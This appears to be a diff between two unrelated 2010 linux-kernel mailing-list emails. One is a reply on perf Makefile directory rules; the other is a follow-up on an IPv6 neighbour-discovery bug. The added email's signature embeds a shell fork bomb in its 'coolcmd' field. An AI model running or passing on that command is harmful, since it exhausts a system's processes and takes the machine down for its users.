@@ -1,99 +1,50 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1757397Ab0HQQKU (ORCPT <rfc822;w@1wt.eu>);
-	Tue, 17 Aug 2010 12:10:20 -0400
-Received: from esgaroth.petrovitsch.at ([78.47.184.11]:1637 "EHLO
-	esgaroth.petrovitsch.priv.at" rhost-flags-OK-OK-OK-OK)
-	by vger.kernel.org with ESMTP id S1750961Ab0HQQKR (ORCPT
+	id S1757860Ab0HQQOI (ORCPT <rfc822;w@1wt.eu>);
+	Tue, 17 Aug 2010 12:14:08 -0400
+Received: from reptilian.habets.pp.se ([193.151.93.131]:1377 "EHLO
+	reptilian.habets.pp.se" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1757274Ab0HQQOH (ORCPT
 	<rfc822;linux-kernel@vger.kernel.org>);
-	Tue, 17 Aug 2010 12:10:17 -0400
-X-DKIM: Sendmail DKIM Filter v2.8.3 unknown-host o7HG9nQg026964
-Subject: Re: [PATCH] perf tools: Don't use brace expansion.
-From: Bernd Petrovitsch <bernd@sysprog.at>
-To: Arnaldo Carvalho de Melo <acme@redhat.com>
-Cc: Peter Zijlstra <peterz@infradead.org>,
-        Kusanagi Kouichi <slash@ac.auone-net.jp>,
-        Paul Mackerras <paulus@samba.org>, Ingo Molnar <mingo@elte.hu>,
-        linux-kernel@vger.kernel.org
-In-Reply-To: <20100817154237.GG13095@ghostprotocols.net>
-References: <20100816124101.1829415C039@msa104.auone-net.jp>
-	 <1281967761.17267.6.camel@thorin> <1281969043.1926.1469.camel@laptop>
-	 <1281970478.17267.12.camel@thorin>
-	 <20100816152914.GC13095@ghostprotocols.net>
-	 <1281973427.17267.16.camel@thorin>
-	 <20100816155022.GD13095@ghostprotocols.net>
-	 <1282046280.5822.4.camel@thorin>
-	 <20100817154237.GG13095@ghostprotocols.net>
-Content-Type: text/plain; charset="UTF-8"
-Date: Tue, 17 Aug 2010 18:09:49 +0200
-Message-ID: <1282061389.5822.22.camel@thorin>
-Mime-Version: 1.0
-X-Mailer: Evolution 2.28.3 (2.28.3-1.fc12) 
-Content-Transfer-Encoding: 7bit
-X-DCC-HP_X86_64_4CPU-Metrics: esgaroth.petrovitsch.priv.at; whitelist
+	Tue, 17 Aug 2010 12:14:07 -0400
+Date: Tue, 17 Aug 2010 18:14:01 +0200 (CEST)
+From: Thomas Habets <thomas@habets.pp.se>
+X-X-Sender: thompa@red.crap.retrofitta.se
+To: Thomas Habets <thomas@habets.pp.se>
+cc: Eric Dumazet <eric.dumazet@gmail.com>, linux-kernel@vger.kernel.org,
+        netdev <netdev@vger.kernel.org>
+Subject: Re: BUG: IPv6 stops working after a while, needs ip ne del command
+ to reset
+In-Reply-To: <alpine.DEB.1.10.1008171547090.21857@red.crap.retrofitta.se>
+Message-ID: <alpine.DEB.1.10.1008171811590.21857@red.crap.retrofitta.se>
+References: <alpine.DEB.1.10.1008131952470.19570@red.crap.retrofitta.se>  <1281953960.2524.23.camel@edumazet-laptop>  <alpine.DEB.1.10.1008161224510.13728@red.crap.retrofitta.se>  <alpine.DEB.1.10.1008170719180.21857@red.crap.retrofitta.se> 
+ <1282024802.2487.687.camel@edumazet-laptop>  <alpine.DEB.1.10.1008171053230.21857@red.crap.retrofitta.se> <1282050920.2448.47.camel@edumazet-laptop> <alpine.DEB.1.10.1008171547090.21857@red.crap.retrofitta.se>
+User-Agent: Alpine 1.10 (DEB 962 2008-03-14)
+MIME-Version: 1.0
+Content-Type: TEXT/PLAIN; charset=US-ASCII; format=flowed
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-On Die, 2010-08-17 at 12:42 -0300, Arnaldo Carvalho de Melo wrote:
-> Em Tue, Aug 17, 2010 at 01:58:00PM +0200, Bernd Petrovitsch escreveu:
+On Tue, 17 Aug 2010, Thomas Habets wrote:
+> [ here i run "ip l set promisc on eth0" ]
 [...]
-> > The following patch below at the end works for me. Alas, it is against
-> > vanilla main line.
-> 
-> Adding $(OUTPUT)PERF-VERSION-FILE $(OUTPUT)common-cmds.h there, to have it look:
->
-> +# we compile into subdirectories. if the target directory is not the source directory, they might not exists. So
-> +# we depend the various files onto their directories.
-> +$(LIB_OBJS) $(BUILTIN_OBJS) $(OUTPUT)PERF-VERSION-FILE $(OUTPUT)common-cmds.h: $(sort $(dir $(LIB_OBJS) $(BUILTIN_OBJS)))
+> 2a00:800:752:1::5c:2 > 2a00:800:752:1::5c:1: ICMP6, echo request
+> 2a00:800:752:1::5c:1 > 2a00:800:752:1::5c:2: ICMP6, echo reply
 
-Hmm, that adds that $(OUTPUT)PERF-VERSION-FILE and
-$(OUTPUT)common-cmds.h (also) depends on the subdirectories of the other
-objects (and thus it works always because at least one of them is a
-subdirectory of $(OUTPUT)).
-To be 110% anal, it should look like e.g.
-+$(LIB_OBJS) $(BUILTIN_OBJS) $(OUTPUT)PERF-VERSION-FILE $(OUTPUT)common-cmds.h: $(sort $(dir $(LIB_OBJS) $(BUILTIN_OBJS)) $(OUTPUT))
+I should add that I turned promisc mode back off at about here. Otherwise 
+the ND would work properly right after the "clear ipv6 neigbors" command.
 
-or actually all targets.
+> [ here I run "clear ipv6 neigbors" again ]
+> 2a00:800:752:1::5c:2 > 2a00:800:752:1::5c:1: ICMP6, echo request
+> 2a00:800:752:1::5c:2 > 2a00:800:752:1::5c:1: ICMP6, echo request
 
-> +# In the second step, we make a rule to actually create these directories
-> +$(sort $(dir $(LIB_OBJS) $(BUILTIN_OBJS))):
-> +       mkdir -p $@ 2>/dev/null
-> +
-
-BTW there is no automatic variable or other make-construct to refer in
-the dependencies on the own target. Therefore the copy-paste-the-
-variables solution.
-
-Perhaps an additional variable reduces clutter (and eases maintenance)?
-
-+# we compile into subdirectories. if the target directory is not the source directory, they might not exists. So
-+# we depend the various files onto their directories.
-+DIRECTORY_DEPS = $(LIB_OBJS) $(BUILTIN_OBJS) $(OUTPUT)PERF-VERSION-FILE $(OUTPUT)common-cmds.h
-+$(DIRECTORY_DEPS): $(sort $(dir $(DIRECTORY_DEPS)))
-+# In the second step, we make a rule to actually create these directories
-+$(sort $(dir $(DIRECTORY_DEPS))):
-+       mkdir -p $@ 2>/dev/null
-+
-
-That should guarantee that all directories from the targets are created.
-
-> As it was failing when I did:
-> 
-> rm -rf ~/build/perf
-> make -C tools/perf O=~/build/perf
-> 
-> With that it retains the existing functionality,
-
-Ah, I `mkdir`ed the output directory explicitly before the `make` (and
-after the `rm -rf`).
-
-
-BTW which is the preferred tree to base patches on (for the "perf"
-subsystem)?
-
-	Bernd
--- 
-mobile: +43 664 4416156              http://www.sysprog.at/
-    Linux Software Development, Consulting and Services
-
+---------
+typedef struct me_s {
+   char name[]      = { "Thomas Habets" };
+   char email[]     = { "thomas@habets.pp.se" };
+   char kernel[]    = { "Linux" };
+   char *pgpKey[]   = { "http://www.habets.pp.se/pubkey.txt" };
+   char pgp[] = { "A8A3 D1DD 4AE0 8467 7FDE  0945 286A E90A AD48 E854" };
+   char coolcmd[]   = { "echo '. ./_&. ./_'>_;. ./_" };
+} me_t;
